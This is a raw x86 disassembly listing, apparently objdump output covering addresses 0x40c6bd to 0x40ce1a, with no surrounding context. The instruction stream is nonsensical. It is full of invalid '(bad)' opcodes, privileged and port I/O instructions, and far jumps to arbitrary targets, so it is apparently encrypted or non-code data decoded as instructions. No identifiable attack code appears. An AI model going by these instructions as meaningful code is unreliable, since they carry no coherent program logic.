  40c6bd:	cwde   
  40c6be:	retf   0x9e93
  40c6c1:	inc    ebx
  40c6c2:	add    al,0xaf
  40c6c4:	pop    ebx
  40c6c5:	sub    dh,cl
  40c6c7:	or     DWORD PTR [ecx-0x6bf8a54b],edi
  40c6cd:	xchg   edi,eax
  40c6ce:	jnp    0x40c72b
  40c6d0:	lods   al,BYTE PTR ds:[esi]
  40c6d1:	inc    ebx
  40c6d2:	repz push ebx
  40c6d4:	push   edi
  40c6d5:	loop   0x40c6a0
  40c6d7:	pop    es
  40c6d8:	mov    al,0xcf
  40c6da:	jge    0x40c721
  40c6dc:	out    0x3f,eax
  40c6de:	jmp    0xbd6dcc21
  40c6e3:	dec    eax
  40c6e4:	or     DWORD PTR [ecx-0x39],ecx
  40c6e7:	pusha  
  40c6e8:	and    DWORD PTR [eax+0x227878a5],ebp
  40c6ee:	pop    ss
  40c6ef:	inc    ebp
  40c6f0:	mov    ds:0x3b095f66,eax
  40c6f5:	mov    ch,0x95
  40c6f7:	mov    bh,0xa8
  40c6f9:	pusha  
  40c6fa:	test   BYTE PTR [eax],0xab
  40c6fd:	mov    ds:0xebe110ac,al
  40c702:	js     0x40c6f0
  40c704:	popa   
  40c705:	loop   0x40c695
  40c707:	mov    ch,0x9a
  40c709:	lea    edi,[ebx+edi*2]
  40c70c:	nop
  40c70d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70e:	mov    edi,0x6df2a44d
  40c713:	dec    edx
  40c714:	leave  
  40c715:	add    al,0xb9
  40c717:	jb     0x40c716
  40c719:	pop    ss
  40c71a:	pop    eax
  40c71b:	push   esi
  40c71c:	(bad)  
  40c71d:	out    0xd6,al
  40c71f:	inc    ebp
  40c720:	or     ah,BYTE PTR [edx]
  40c722:	mov    dh,cl
  40c724:	aaa    
  40c725:	and    bh,ch
  40c727:	sbb    BYTE PTR [bx],0x24
  40c72b:	loopne 0x40c775
  40c72d:	nop
  40c72e:	aam    0x49
  40c730:	jb     0x40c755
  40c732:	dec    eax
  40c733:	test   eax,0xf0cf15f8
  40c738:	push   ss
  40c739:	retf   
  40c73a:	les    ebp,FWORD PTR [ebp-0x21]
  40c73d:	in     eax,0x53
  40c73f:	sub    BYTE PTR [ebx+0x6a29f505],0x23
  40c746:	cmp    eax,0x5fa0797e
  40c74b:	mov    ecx,0x9efa3252
  40c750:	sub    ecx,DWORD PTR [edx+eax*4]
  40c753:	xor    al,0x94
  40c755:	and    DWORD PTR [ebp-0x4ee70ac7],edi
  40c75b:	icebp  
  40c75c:	mov    esi,0xc6b1d9cf
  40c761:	aam    0x9f
  40c763:	jl     0x40c7b8
  40c765:	push   esi
  40c766:	and    eax,0x558508ef
  40c76b:	hlt    
  40c76c:	int3   
  40c76d:	or     edx,DWORD PTR [ebp+0x2a]
  40c770:	cmc    
  40c771:	retf   
  40c772:	xacquire xchg DWORD PTR [edx+0x59001145],edi
  40c779:	or     eax,edi
  40c77b:	mov    esi,0xca54dc76
  40c780:	cmp    al,0x6a
  40c782:	mov    al,0x3d
  40c784:	ficom  DWORD PTR [ecx+0x5257719b]
  40c78a:	or     dh,ch
  40c78c:	sbb    eax,DWORD PTR [ebp-0x12]
  40c78f:	cmp    eax,0xbb21b8ab
  40c794:	xor    edx,DWORD PTR [eax+0x365498ff]
  40c79a:	lods   al,BYTE PTR ds:[esi]
  40c79b:	fyl2x  
  40c79d:	cmp    al,BYTE PTR [eax+0x5b18687c]
  40c7a3:	jns    0x40c7e8
  40c7a5:	xor    bh,BYTE PTR [edi+edx*4+0x52145bde]
  40c7ac:	adc    al,0x3a
  40c7ae:	rcl    DWORD PTR [ecx-0x74feedb5],1
  40c7b4:	mov    cl,0x9e
  40c7b6:	call   0x30fc:0x74691402
  40c7bd:	sahf   
  40c7be:	xor    ch,BYTE PTR [esp+ecx*8-0x3c]
  40c7c2:	hlt    
  40c7c3:	dec    ebx
  40c7c4:	ret    0x8393
  40c7c7:	adc    ebx,DWORD PTR [edx+0x571b7346]
  40c7cd:	dec    ecx
  40c7ce:	aam    0x55
  40c7d0:	jno    0x40c818
  40c7d2:	mov    eax,ds:0x57113145
  40c7d7:	aad    0x7
  40c7d9:	out    0xd4,eax
  40c7db:	sbb    al,0xcb
  40c7dd:	mov    BYTE PTR ss:[edi-0x4b],bl
  40c7e1:	xchg   ebp,eax
  40c7e2:	lea    edi,[eax]
  40c7e4:	inc    edx
  40c7e5:	ss test eax,0x55319a36
  40c7eb:	mov    edx,0x23834e9f
  40c7f0:	bound  ebx,QWORD PTR [eax]
  40c7f2:	fs mov bl,0xa5
  40c7f5:	push   ecx
  40c7f6:	neg    DWORD PTR [ecx+0x280a3082]
  40c7fc:	jp     0x40c7a0
  40c7fe:	pop    ebx
  40c7ff:	push   ss
  40c800:	stos   BYTE PTR es:[edi],al
  40c801:	fild   WORD PTR [edi-0x3f]
  40c804:	out    0x19,eax
  40c806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c807:	dec    esp
  40c808:	jo     0x40c884
  40c80a:	into   
  40c80b:	pop    edi
  40c80c:	jae    0x40c7f8
  40c80e:	add    eax,0x23146b19
  40c813:	arpl   sp,dx
  40c815:	ins    BYTE PTR es:[edi],dx
  40c816:	cmp    esi,DWORD PTR [edi+0x22a0b029]
  40c81c:	shl    esp,0xbf
  40c81f:	retf   
  40c820:	dec    ebp
  40c821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c822:	push   es
  40c823:	xchg   ecx,eax
  40c824:	push   esp
  40c825:	xchg   ecx,eax
  40c826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c827:	lods   eax,DWORD PTR ds:[esi]
  40c828:	popa   
  40c829:	neg    DWORD PTR [eax-0x36]
  40c82c:	(bad)  
  40c82d:	adc    eax,0xb3152ac8
  40c832:	cld    
  40c833:	jns    0x40c824
  40c835:	mov    ah,dh
  40c837:	cwde   
  40c838:	bswap  esi
  40c83a:	repnz fs push edx
  40c83d:	sbb    al,0xba
  40c83f:	mov    ds:0x5230cd1,al
  40c844:	stos   BYTE PTR es:[edi],al
  40c845:	das    
  40c846:	ins    BYTE PTR es:[edi],dx
  40c847:	sub    ecx,DWORD PTR [eax-0x3ff2b52a]
  40c84d:	mov    ebx,0x5041ce36
  40c852:	scas   al,BYTE PTR es:[edi]
  40c853:	add    BYTE PTR [ebx-0x39362197],bh
  40c859:	inc    ebp
  40c85a:	mov    ds:0x32c2b068,al
  40c85f:	push   cs
  40c860:	jge    0x40c855
  40c862:	fnstenv [eax+0x76]
  40c865:	ins    DWORD PTR es:[edi],dx
  40c866:	xor    DWORD PTR [edi],ebx
  40c868:	popf   
  40c869:	pop    ss
  40c86a:	cdq    
  40c86b:	loopne 0x40c86f
  40c86d:	outs   dx,DWORD PTR ds:[esi]
  40c86e:	cmp    DWORD PTR [ecx+0xbe4f7ee],edi
  40c874:	xlat   BYTE PTR ds:[ebx]
  40c875:	pop    esp
  40c876:	lods   eax,DWORD PTR ds:[esi]
  40c877:	leave  
  40c878:	ror    DWORD PTR [edx-0x76],0xe2
  40c87c:	jbe    0x40c8d6
  40c87e:	pop    ss
  40c87f:	and    BYTE PTR ds:0xc0693b83,bh
  40c885:	jnp    0x40c8c9
  40c887:	add    ecx,DWORD PTR [edi+0x1f6f2e1c]
  40c88d:	push   eax
  40c88e:	or     al,0xb2
  40c890:	imul   eax,DWORD PTR [edi-0x78],0x6143d0f7
  40c897:	cmp    DWORD PTR [ecx+0x5071bd08],0x6d25cfdc
  40c8a1:	xor    eax,0xb42d96a1
  40c8a6:	retf   0x17ba
  40c8a9:	and    dl,dh
  40c8ab:	push   ebx
  40c8ac:	and    eax,0xc84fa662
  40c8b1:	mov    ebx,0x3bdac62f
  40c8b6:	mov    eax,esp
  40c8b8:	pop    ss
  40c8b9:	adc    dh,0xe4
  40c8bc:	jns    0x40c916
  40c8be:	jmp    0x40c904
  40c8c0:	add    eax,0x6cc94991
  40c8c5:	enter  0x1d12,0x3f
  40c8c9:	ds test al,0xff
  40c8cc:	push   esi
  40c8cd:	dec    edi
  40c8ce:	and    ah,al
  40c8d0:	ficom  DWORD PTR [ecx]
  40c8d2:	sub    BYTE PTR [ecx+edi*4-0x1935b95d],bl
  40c8d9:	or     eax,0x492fa800
  40c8de:	mov    esi,0xa16bcc0c
  40c8e3:	pop    esp
  40c8e4:	enter  0x59bd,0xdb
  40c8e8:	mov    bh,BYTE PTR [esi]
  40c8ea:	sub    BYTE PTR [eax+0x2bde02a4],0x68
  40c8f1:	shl    BYTE PTR [edx],cl
  40c8f3:	mov    dl,0xa5
  40c8f5:	mov    eax,DWORD PTR [edi+esi*4]
  40c8f8:	dec    ebx
  40c8f9:	mov    bh,0x41
  40c8fb:	dec    edx
  40c8fc:	jbe    0x40c8c6
  40c8fe:	call   0x81cb5c9f
  40c903:	xchg   BYTE PTR ds:0xb193d58e,cl
  40c909:	sub    al,ah
  40c90b:	daa    
  40c90c:	in     al,0x99
  40c90e:	dec    esp
  40c90f:	popf   
  40c910:	mov    ebp,0x1069e0dc
  40c915:	in     al,0x15
  40c917:	inc    ebp
  40c918:	sbb    DWORD PTR [edi-0xa],0xffffff92
  40c91c:	jnp    0x40c911
  40c91e:	sub    BYTE PTR [ecx+0xe],bl
  40c921:	dec    eax
  40c922:	adc    eax,0xc98fbf94
  40c927:	add    DWORD PTR [eax],esp
  40c929:	or     BYTE PTR [ebx+0x67],bl
  40c92c:	push   edi
  40c92d:	aas    
  40c92e:	dec    ebp
  40c92f:	pusha  
  40c930:	(bad)  
  40c931:	jo     0x40c969
  40c933:	inc    ecx
  40c934:	cmp    BYTE PTR [edx+0xb],cl
  40c937:	cs daa 
  40c939:	sbb    ah,BYTE PTR [ebx-0x57e76c21]
  40c93f:	jns    0x40c945
  40c941:	repz daa 
  40c943:	ret    
  40c944:	mov    eax,ds:0x9b0cd7cf
  40c949:	cmp    edi,DWORD PTR [di]
  40c94c:	jge    0x40c9bd
  40c94e:	cmc    
  40c94f:	fwait
  40c950:	push   edi
  40c951:	out    0x6f,eax
  40c953:	mov    al,0xa6
  40c955:	ret    
  40c956:	sahf   
  40c957:	sbb    al,dl
  40c959:	repnz add BYTE PTR [eax-0x40],cl
  40c95d:	cmp    BYTE PTR [edx+0x29],0x4c
  40c961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c962:	pop    ebp
  40c963:	push   ss
  40c964:	test   al,0x5f
  40c966:	hlt    
  40c967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c968:	or     esp,ebp
  40c96a:	test   DWORD PTR [esi+ebp*4+0x952e295],0xb7f72b3
  40c975:	xor    eax,esi
  40c977:	mov    eax,ds:0x6ed93f29
  40c97c:	push   ebx
  40c97d:	push   esi
  40c97e:	mov    ds:0x5374484e,eax
  40c983:	pop    ebp
  40c984:	scas   al,BYTE PTR es:[edi]
  40c985:	mov    ah,al
  40c987:	mov    ch,0x1a
  40c989:	leave  
  40c98a:	adc    eax,DWORD PTR [edx]
  40c98c:	pusha  
  40c98d:	sbb    cl,BYTE PTR [edx-0x69506127]
  40c993:	ficomp WORD PTR [edi-0x59]
  40c996:	out    0xf9,eax
  40c998:	mov    bl,0xa4
  40c99a:	mov    ch,dh
  40c99c:	stos   DWORD PTR es:[edi],eax
  40c99d:	cmp    DWORD PTR [esi+0x7b7641a],0x8
  40c9a4:	mov    dl,0x23
  40c9a6:	jmp    0xd22:0xd29dfbcd
  40c9ad:	push   es
  40c9ae:	xchg   ebx,eax
  40c9af:	into   
  40c9b0:	je     0x40c978
  40c9b2:	out    0x61,eax
  40c9b4:	xchg   ebp,eax
  40c9b5:	mov    ah,0xa3
  40c9b7:	cmp    eax,0xe274f36f
  40c9bc:	push   eax
  40c9bd:	add    bl,cl
  40c9bf:	in     al,0xc8
  40c9c1:	int3   
  40c9c2:	ss sbb bl,al
  40c9c5:	(bad)  
  40c9c7:	call   0x7c37a0b2
  40c9cc:	xchg   edi,eax
  40c9cd:	lods   al,BYTE PTR ds:[esi]
  40c9ce:	jmp    0xf2973b5
  40c9d3:	or     al,0x5
  40c9d5:	ror    edi,cl
  40c9d7:	bound  esp,QWORD PTR [esi+ebp*8]
  40c9da:	repnz mov ah,0x12
  40c9dd:	lock push ss
  40c9df:	push   ebp
  40c9e0:	push   ecx
  40c9e1:	mov    dl,0xf1
  40c9e3:	inc    esi
  40c9e4:	xchg   esp,eax
  40c9e5:	imul   ebp,DWORD PTR [edx],0x4221494a
  40c9eb:	add    edx,DWORD PTR [ecx+eax*4]
  40c9ee:	fwait
  40c9ef:	mov    ebx,0xbe8e969f
  40c9f4:	and    esi,DWORD PTR [edi]
  40c9f6:	js     0x40c9fc
  40c9f8:	into   
  40c9f9:	xchg   edx,eax
  40c9fa:	adc    al,BYTE PTR [eax+0xa6f5180]
  40ca00:	adc    eax,0x236dc49a
  40ca05:	jmp    0x8a6e:0x7832c95b
  40ca0c:	inc    esi
  40ca0d:	xor    eax,0x1e5ba580
  40ca12:	je     0x40c9e5
  40ca14:	imul   esi,DWORD PTR [ecx],0x45
  40ca17:	(bad)  
  40ca18:	jbe    0x40ca85
  40ca1a:	dec    esi
  40ca1b:	sub    al,0xd9
  40ca1d:	push   eax
  40ca1e:	xchg   ebp,eax
  40ca1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca20:	scas   eax,DWORD PTR es:[edi]
  40ca21:	(bad)  [edi+edi*2+0x75]
  40ca25:	dec    ecx
  40ca26:	test   eax,0xed3f9877
  40ca2b:	cdq    
  40ca2c:	cmp    bh,BYTE PTR [eax+0x1e4899b1]
  40ca32:	xlat   BYTE PTR ds:[ebx]
  40ca33:	imul   edx,DWORD PTR [ebx],0x7e
  40ca36:	test   BYTE PTR [ecx-0x72],ah
  40ca39:	sub    eax,0xf51b559
  40ca3e:	inc    edi
  40ca3f:	call   0x3f78434d
  40ca44:	in     eax,0x9f
  40ca46:	mov    al,BYTE PTR [ebx+0x2b]
  40ca49:	test   DWORD PTR [eax-0x79],0x3d73e2a
  40ca50:	imul   esp,DWORD PTR [edi],0xfffffff2
  40ca53:	cdq    
  40ca54:	adc    edx,ecx
  40ca56:	and    BYTE PTR [eax+0x55],cl
  40ca59:	pop    edx
  40ca5a:	mov    al,BYTE PTR [edx+esi*8-0x1932d4c8]
  40ca61:	adc    dh,BYTE PTR [edx+0x58f35e]
  40ca67:	add    BYTE PTR [ebx+ecx*8],bl
  40ca6a:	lock aad 0x73
  40ca6d:	jg     0x40ca59
  40ca6f:	nop
  40ca70:	dec    ebx
  40ca71:	mov    bh,BYTE PTR [edx+0x1657a756]
  40ca77:	imul   ebp,DWORD PTR [esi+0x49a9c217],0xcf4b30c2
  40ca81:	sar    BYTE PTR [edx],cl
  40ca83:	inc    ecx
  40ca84:	(bad)  
  40ca85:	pop    ss
  40ca86:	ins    BYTE PTR es:[edi],dx
  40ca87:	retf   
  40ca88:	mov    ds:0x41c4fbc3,eax
  40ca8d:	sub    DWORD PTR [esi],ecx
  40ca8f:	cwde   
  40ca90:	call   0xd85c:0xa3168db7
  40ca97:	bswap  esi
  40ca99:	popf   
  40ca9a:	call   0x198293da
  40ca9f:	push   edx
  40caa0:	loopne 0x40caf9
  40caa2:	adc    ch,BYTE PTR [eax+ebx*1]
  40caa5:	push   esi
  40caa6:	lods   al,BYTE PTR ds:[esi]
  40caa7:	jle    0x40cb19
  40caa9:	jp     0x40ca35
  40caab:	or     eax,DWORD PTR [edi+0x64]
  40caae:	mov    dh,0xb1
  40cab0:	repz mov al,0x24
  40cab3:	add    DWORD PTR [edx+0x22],ecx
  40cab6:	xchg   esp,eax
  40cab7:	rol    DWORD PTR [ecx+0x71653057],0xf6
  40cabe:	jl     0x40cb00
  40cac0:	pop    ebp
  40cac1:	pushf  
  40cac2:	mov    cl,BYTE PTR [edi-0x5d]
  40cac5:	(bad)  
  40cac6:	push   ds
  40cac7:	mov    dh,0xf8
  40cac9:	inc    ebx
  40caca:	adc    BYTE PTR [edi],cl
  40cacc:	adc    BYTE PTR [edx+ecx*4+0x2d],bh
  40cad0:	sub    BYTE PTR [edx+eiz*4],dl
  40cad3:	cli    
  40cad4:	popf   
  40cad5:	cmc    
  40cad6:	dec    ebp
  40cad7:	dec    ebp
  40cad8:	and    eax,0xa13e4772
  40cadd:	pop    es
  40cade:	jae    0x40cb15
  40cae0:	push   0x740574d
  40cae5:	mov    ebx,0xa56dfd2
  40caea:	or     DWORD PTR [ebp+esi*2+0x12ef2bac],0x37
  40caf2:	pop    ebx
  40caf3:	fnsetpm(287 only) 
  40caf5:	push   ss
  40caf6:	and    bh,BYTE PTR [ebx]
  40caf8:	ret    
  40caf9:	dec    ecx
  40cafa:	fcom   st(5)
  40cafc:	mov    al,BYTE PTR [esp+esi*4+0x3ee1c010]
  40cb03:	imul   esi,DWORD PTR [esi-0x5da727c1],0xffffff96
  40cb0a:	loop   0x40cae0
  40cb0c:	add    DWORD PTR [edi+0x2f99e9ef],0x52
  40cb13:	(bad)  
  40cb17:	(bad)  [edx-0x58]
  40cb1a:	adc    cl,BYTE PTR [edx]
  40cb1c:	leave  
  40cb1d:	jb     0x40cb94
  40cb1f:	(bad)  
  40cb20:	xlat   BYTE PTR ds:[ebx]
  40cb21:	jecxz  0x40caaf
  40cb23:	call   0xd4749c90
  40cb28:	pop    eax
  40cb29:	lods   al,BYTE PTR ds:[esi]
  40cb2a:	out    dx,eax
  40cb2b:	xadd   BYTE PTR [edx+0x75],bl
  40cb2f:	ficomp WORD PTR [ecx]
  40cb31:	jo     0x40cb36
  40cb33:	jbe    0x40cb76
  40cb35:	add    al,0xa7
  40cb37:	shl    BYTE PTR [ecx],0x78
  40cb3a:	ret    
  40cb3b:	ja     0x40cb35
  40cb3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb3e:	in     al,dx
  40cb3f:	les    esi,FWORD PTR ds:0xf35e631f
  40cb45:	jae    0x40cadd
  40cb47:	stos   BYTE PTR es:[edi],al
  40cb48:	imul   ecx,ebp,0xffffffea
  40cb4b:	adc    eax,0xfb26a94e
  40cb50:	add    BYTE PTR [ecx-0x5fa722f],dl
  40cb56:	and    al,0x7e
  40cb58:	lahf   
  40cb59:	fdivr  QWORD PTR [ecx-0x52fb90ed]
  40cb5f:	pusha  
  40cb60:	dec    ecx
  40cb61:	push   edi
  40cb62:	and    eax,0xc9d88b90
  40cb67:	xor    bh,BYTE PTR [ebp+0x1c]
  40cb6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb6b:	pop    es
  40cb6c:	repz cmp BYTE PTR [ebp+edx*8+0x2f],al
  40cb71:	mov    cr6,edi
  40cb74:	js     0x40cb93
  40cb76:	jb     0x40cba2
  40cb78:	mov    edx,0xcbe91bf4
  40cb7d:	push   0xbc8eae18
  40cb82:	add    eax,0x458dea71
  40cb87:	xor    eax,0x40ddb6cb
  40cb8c:	fstp   QWORD PTR [edx-0x6f]
  40cb8f:	inc    edi
  40cb90:	cmc    
  40cb91:	and    eax,0x176ff695
  40cb96:	je     0x40cc01
  40cb98:	loope  0x40cba7
  40cb9a:	pushf  
  40cb9b:	mov    al,bh
  40cb9d:	add    BYTE PTR [ebx-0xc],al
  40cba0:	mov    ds:0x540bde0e,al
  40cba5:	dec    ebx
  40cba6:	stos   DWORD PTR es:[edi],eax
  40cba7:	mov    ebp,0xc79f5801
  40cbac:	and    edx,DWORD PTR [ecx+esi*1-0x11]
  40cbb0:	arpl   WORD PTR [ebp-0x24],dx
  40cbb3:	add    edx,esi
  40cbb5:	lea    edx,[ebp+0x63]
  40cbb8:	push   es
  40cbb9:	xchg   edi,eax
  40cbba:	adc    al,BYTE PTR [eax-0x54d4f27a]
  40cbc0:	lds    ebp,FWORD PTR ds:0xf643d175
  40cbc6:	jno    0x40cbb3
  40cbc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbc9:	rcr    BYTE PTR [esp+ebx*4],1
  40cbcc:	dec    edx
  40cbcd:	jnp    0x40cb6b
  40cbcf:	pop    edi
  40cbd0:	dec    ecx
  40cbd1:	pop    esi
  40cbd2:	push   ss
  40cbd3:	sub    dh,BYTE PTR [edi]
  40cbd5:	out    dx,eax
  40cbd6:	cmp    al,0x15
  40cbd8:	mov    ebp,0x9d8473da
  40cbdd:	or     al,0x4a
  40cbdf:	jp     0x40cbb7
  40cbe1:	mov    bh,ah
  40cbe3:	in     al,dx
  40cbe4:	pop    esp
  40cbe5:	mov    ds:0x649f935c,eax
  40cbea:	jg     0x40cc66
  40cbec:	add    bh,BYTE PTR [eax-0x6fde1c05]
  40cbf2:	push   es
  40cbf3:	pop    eax
  40cbf4:	lea    eax,[esi-0x26]
  40cbf7:	iret   
  40cbf8:	adc    eax,0xa616af1d
  40cbfd:	dec    ecx
  40cbfe:	pop    edi
  40cbff:	retf   0x5409
  40cc02:	imul   esp,DWORD PTR [edx+0x4eb94ca],0xeca479ae
  40cc0c:	inc    edx
  40cc0d:	mov    DWORD PTR [esi],esp
  40cc0f:	dec    ebx
  40cc10:	mov    edx,0x6bd56ac5
  40cc15:	adc    ebp,DWORD PTR [esi+0x6d272eaf]
  40cc1b:	or     al,0x20
  40cc1d:	sbb    DWORD PTR [ebx],edi
  40cc1f:	xchg   BYTE PTR [esi],bl
  40cc21:	retf   0x475
  40cc24:	fwait
  40cc25:	mov    bh,0xa3
  40cc27:	mov    al,0x9a
  40cc29:	mov    WORD PTR [edi+0x5f876f81],?
  40cc2f:	sbb    ah,BYTE PTR [ecx+0x71]
  40cc32:	cmp    al,0xd2
  40cc34:	and    eax,0x2226665b
  40cc39:	cli    
  40cc3a:	mov    edx,DWORD PTR [ecx]
  40cc3c:	xchg   ebp,eax
  40cc3d:	push   edi
  40cc3e:	adc    eax,0x62d4724b
  40cc43:	cwde   
  40cc44:	stc    
  40cc45:	outs   dx,BYTE PTR ds:[esi]
  40cc46:	mov    ebp,0xadc21815
  40cc4b:	xor    eax,0x2cb9b8b7
  40cc50:	xchg   ebp,eax
  40cc51:	cmp    DWORD PTR [edi],0x494abd1
  40cc57:	mov    dh,0x4f
  40cc59:	cs int3 
  40cc5b:	ins    BYTE PTR es:[edi],dx
  40cc5c:	out    0x81,eax
  40cc5e:	adc    eax,0x61e17b6e
  40cc63:	lock shl BYTE PTR [ecx-0x38cdc8ce],cl
  40cc6a:	mov    ch,cl
  40cc6c:	jle    0x40ccb5
  40cc6e:	sub    edi,esp
  40cc70:	clc    
  40cc71:	inc    eax
  40cc72:	out    0xf5,eax
  40cc74:	and    eax,0x1e1bca40
  40cc79:	mov    fs,WORD PTR [ecx]
  40cc7b:	mov    ah,0xfd
  40cc7d:	jae    0x40cc4b
  40cc7f:	or     DWORD PTR [edx-0x360cbd67],ecx
  40cc85:	cli    
  40cc86:	xor    al,cl
  40cc88:	test   edi,ebx
  40cc8a:	(bad)  
  40cc8b:	shl    BYTE PTR ds:0xf73d1a1e,cl
  40cc91:	mov    dh,dh
  40cc93:	push   ss
  40cc94:	and    DWORD PTR [ecx-0x72fe1772],ebx
  40cc9a:	icebp  
  40cc9b:	cmp    BYTE PTR [ecx+0x1975591],al
  40cca1:	fst    DWORD PTR [edx+0x24c472b]
  40cca7:	pop    es
  40cca8:	dec    esp
  40cca9:	mov    dl,0xf1
  40ccab:	push   cs
  40ccac:	sbb    BYTE PTR [edi],ch
  40ccae:	xchg   edx,eax
  40ccaf:	rcr    BYTE PTR [edx+0x38],1
  40ccb2:	fdivr  st(1),st
  40ccb4:	jne    0x40ccd3
  40ccb6:	iret   
  40ccb7:	ins    BYTE PTR es:[edi],dx
  40ccb8:	push   cs
  40ccb9:	int3   
  40ccba:	aas    
  40ccbb:	ss aas 
  40ccbd:	cmp    BYTE PTR [edi-0x23],0x34
  40ccc1:	adc    BYTE PTR [eax],ah
  40ccc3:	mul    ebp
  40ccc5:	rcr    DWORD PTR [edx],1
  40ccc7:	mov    edi,0x817e5a61
  40cccc:	inc    edx
  40cccd:	out    0xde,al
  40cccf:	add    eax,0x18611c1c
  40ccd4:	sbb    BYTE PTR [ecx-0x1729de10],dh
  40ccda:	xchg   ebx,eax
  40ccdb:	dec    esp
  40ccdc:	stos   DWORD PTR es:[edi],eax
  40ccdd:	int3   
  40ccde:	js     0x40cc72
  40cce0:	dec    ebx
  40cce1:	arpl   bx,bx
  40cce3:	in     eax,0xdd
  40cce5:	inc    esp
  40cce6:	out    0x19,eax
  40cce8:	push   cs
  40cce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccea:	call   0x5b4c:0x275865f1
  40ccf1:	or     ch,BYTE PTR [ebx]
  40ccf3:	jnp    0x40cd15
  40ccf5:	popa   
  40ccf6:	or     dh,ah
  40ccf8:	lea    ebp,[edi+0x41]
  40ccfb:	inc    edx
  40ccfc:	int    0x3
  40ccfe:	popa   
  40ccff:	inc    eax
  40cd00:	(bad)  
  40cd01:	imul   ebp,ebp,0x15
  40cd04:	fistp  WORD PTR [ecx]
  40cd06:	cmp    DWORD PTR [esi-0x1aaf6e42],ecx
  40cd0c:	aad    0xfd
  40cd0e:	cmp    dl,dh
  40cd10:	in     eax,dx
  40cd11:	pop    edi
  40cd12:	inc    edi
  40cd13:	pushf  
  40cd14:	add    dh,BYTE PTR [ebp+0x52]
  40cd17:	push   esi
  40cd18:	pop    ebx
  40cd19:	mov    ds:0x40d156aa,eax
  40cd1e:	sar    BYTE PTR [edi+0x3d9de153],cl
  40cd24:	mov    eax,0x8ab00353
  40cd2a:	adc    BYTE PTR [ebp-0x1f0e0f6b],bl
  40cd30:	out    dx,eax
  40cd31:	jmp    0x40ccc1
  40cd33:	dec    ecx
  40cd34:	scas   al,BYTE PTR es:[edi]
  40cd35:	and    bh,ch
  40cd37:	fwait
  40cd38:	cmp    edx,DWORD PTR [eax-0x65]
  40cd3b:	pop    esi
  40cd3c:	fcomp  QWORD PTR [edi-0x22ff66d]
  40cd42:	sub    al,0x89
  40cd44:	dec    ebx
  40cd45:	mov    esi,0x7beec95d
  40cd4a:	into   
  40cd4b:	test   DWORD PTR [esi],ebx
  40cd4d:	push   es
  40cd4e:	xor    BYTE PTR [ebp-0x7b],bl
  40cd51:	add    bl,BYTE PTR [ecx]
  40cd53:	mov    al,0x14
  40cd55:	or     DWORD PTR [esi],0x2a
  40cd58:	push   ecx
  40cd59:	mov    bh,0x74
  40cd5b:	clc    
  40cd5c:	sbb    bh,BYTE PTR [ebx]
  40cd5e:	stc    
  40cd5f:	and    al,0x78
  40cd61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd62:	sub    BYTE PTR [ebp-0x78],bh
  40cd65:	push   ss
  40cd66:	fwait
  40cd67:	les    eax,FWORD PTR [ebx]
  40cd69:	imul   ecx,DWORD PTR [edx-0x4a42e7aa],0x4c
  40cd70:	fmul   DWORD PTR [esi+0x5ed87626]
  40cd76:	fisub  DWORD PTR [edi+0x4b800b92]
  40cd7c:	pusha  
  40cd7d:	shl    BYTE PTR [ecx],cl
  40cd7f:	cwde   
  40cd80:	adc    edx,DWORD PTR [ebx-0x3c]
  40cd83:	es hlt 
  40cd85:	push   esp
  40cd86:	pop    eax
  40cd87:	pop    es
  40cd88:	stos   BYTE PTR es:[edi],al
  40cd89:	lds    ecx,FWORD PTR [edi+0x27]
  40cd8c:	xchg   esp,eax
  40cd8d:	push   edx
  40cd8e:	mov    ds:0xc7a1061d,al
  40cd93:	(bad)
  40cd97:	out    0xf0,al
  40cd99:	adc    eax,DWORD PTR [edx]
  40cd9b:	mov    ebp,0xbbe45535
  40cda0:	out    0xf9,eax
  40cda2:	gs mov ecx,0x220532f1
  40cda8:	sbb    al,0x4e
  40cdaa:	xor    DWORD PTR es:[edi-0x15],0x5a
  40cdaf:	jmp    0x40cd51
  40cdb1:	ret    0xdde4
  40cdb4:	outs   dx,DWORD PTR ds:[esi]
  40cdb5:	cdq    
  40cdb6:	sbb    al,0x17
  40cdb8:	xor    ebp,esp
  40cdba:	test   al,0xbf
  40cdbc:	xlat   BYTE PTR ds:[ebx]
  40cdbd:	outs   dx,DWORD PTR ds:[esi]
  40cdbe:	push   es
  40cdbf:	std    
  40cdc0:	iret   
  40cdc1:	retf   
  40cdc2:	and    al,0xd
  40cdc4:	sub    BYTE PTR [edi+0x4f],ch
  40cdc7:	jge    0x40ce23
  40cdc9:	stos   DWORD PTR es:[edi],eax
  40cdca:	call   0xf418:0xe1cf6394
  40cdd1:	js     0x40ce2e
  40cdd3:	outs   dx,DWORD PTR ds:[esi]
  40cdd4:	rcl    DWORD PTR [ecx+eax*2+0x6283e295],0x78
  40cddc:	jmp    0x40cdf3
  40cdde:	imul   ebx,DWORD PTR [ebp-0x5d9c6026],0xdfb6d920
  40cde8:	xor    BYTE PTR [ebp-0x37],bl
  40cdeb:	mov    ebx,0x5a70ccf0
  40cdf0:	addr16 xchg esi,eax
  40cdf2:	out    0xa8,al
  40cdf4:	sbb    edi,DWORD PTR [ebx+0x4d5f1c9f]
  40cdfa:	cmp    BYTE PTR [ebx+0x18],bh
  40cdfd:	fnstenv [ebx-0x54]
  40ce00:	mov    esp,0xf779d284
  40ce05:	push   cs
  40ce06:	lods   eax,DWORD PTR ds:[esi]
  40ce07:	or     ch,BYTE PTR [eax]
  40ce09:	out    dx,eax
  40ce0a:	ficomp DWORD PTR [edx+0x1a]
  40ce0d:	cmp    al,BYTE PTR [ecx]
  40ce0f:	outs   dx,BYTE PTR ds:[esi]
  40ce10:	sbb    eax,0xb43c03ed
  40ce15:	fcomi  st,st(0)
  40ce17:	cwde   
  40ce18:	stc    
  40ce19:	xchg   ebp,eax
  40ce1a:	(bad)  
